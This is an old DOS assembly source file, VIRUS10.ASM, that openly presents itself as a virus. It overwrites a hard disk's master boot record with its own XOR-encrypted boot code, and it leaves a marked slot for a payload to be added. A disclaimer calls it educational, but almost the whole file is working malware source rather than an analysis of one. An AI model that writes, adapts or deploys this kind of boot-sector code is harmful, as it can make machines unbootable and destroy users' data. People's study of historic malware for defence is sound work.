;
;	VIRUS10.ASM
;
;	Author: Johan Gardhage <johan.gardhage@gmail.com>
;	Originally written in 1995.
;
; Description:
; This virus is a MBR (Master Boot Record) bomb. It simply replaces the MBR of the
; disk with the virus code.
;
; Disclaimer:
; I take no responsibility for any damage, either direct or implied,
; caused by the usage of this virus source code or of the resulting code
; after assembly. The code was written for educational purposes ONLY.
;

	.model	tiny
	.code
	.startup
	locals @@

BeginVirus:
	mov	ax,9f80h				; Very high memory
	mov	es,ax					; good for buffer

	mov	ax,0201h				; Read the original
	mov	cx,0001h				; MBR of the disk
	mov	dx,0080h
	xor	bx,bx					; to buffer 9f80:0000h
	int	13h					;

	push	cs
	pop	ds

	mov	ah,2ch					; Get random number
	int	21h
	mov	Key,dx

	mov	ax,dx
	mov	cx,(EndEncryptedSection-BeginEncryptedSection)/2
	mov	di,offset BeginEncryptedSection
	call	EncryptDecrypt

	mov	ax,9f80h				; Add the bomb to the
	mov	es,ax					; real MBR in the
	mov	si,offset BeginMbrSection		; buffer
	xor	di,di
	mov	cx,(EndMbrSection-BeginMbrSection)	; ds:[fat]=>9f80:0000h
	repe	movsb

	mov	ax,9f80h
	mov	es,ax

	xor	bx,bx					; Replace the original
	mov	ax,0301h				; MBR on the disk by
	xor	ch,ch					; the bomb
	mov	dx,0080h
	mov	cl,1					; WARNING, VSAFE/MSAVE
	mov	bx,0					; NOTICES THIS ACTION
	int	13h

	int	20h					; End program

;---------------------------------------------------------------------
;	Start of MBR code
;---------------------------------------------------------------------

BeginMbrSection:
	call	@@delta
@@delta:pop	bp
	sub	bp,offset @@delta
	mov	ax,[bp+Key]
	mov	cx,(EndEncryptedSection-BeginEncryptedSection)/2
	lea	di,[bp+BeginEncryptedSection]
	call	EncryptDecrypt

BeginEncryptedSection:
	cli						; # PART OF MBR STRUCT
	xor	ax,ax					; # DO NOT MODIFY.
	mov	ss,ax					; #
	mov	sp,7C00h				; #
	mov	si,sp					; #
	push	ax					; #
	pop	es					; #
	push	ax					; #
	pop	ds					; #
	sti						; #
							; #
	pushf						; #
	push	ax					; #
	push	cx					; #
	push	dx					; #
	push	ds					; #
	push	es					; #

; PUT PAYLOAD CODE HERE

	pop	es					; # PART OF MBR STRUCT
	pop	ds					; # DO NOT MODIFY.
	pop	dx					; #
	pop	cx					; #
	pop	ax					; #
	popf						; #
							; #
	xor	ax,ax					; #
	mov	es,ax					; #
	mov	bx,7c00h				; #
	mov	ah,02					; #
	mov	al,1					; #
	mov	cl,1					; #
	mov	ch,0					; #
	mov	dh,1					; #
	mov	dl,80h					; #
							; #
	int	13h					; #
							; #
	db	0eah,00,7ch,00,00			; #

EndEncryptedSection:

EncryptDecrypt:
	xor	[di],ax					; A simple xor loop
	inc	di
	inc	di
	loop	EncryptDecrypt
	ret
Key	dw	0

EndMbrSection:

;---------------------------------------------------------------------
;	End of MBR code
;---------------------------------------------------------------------

end
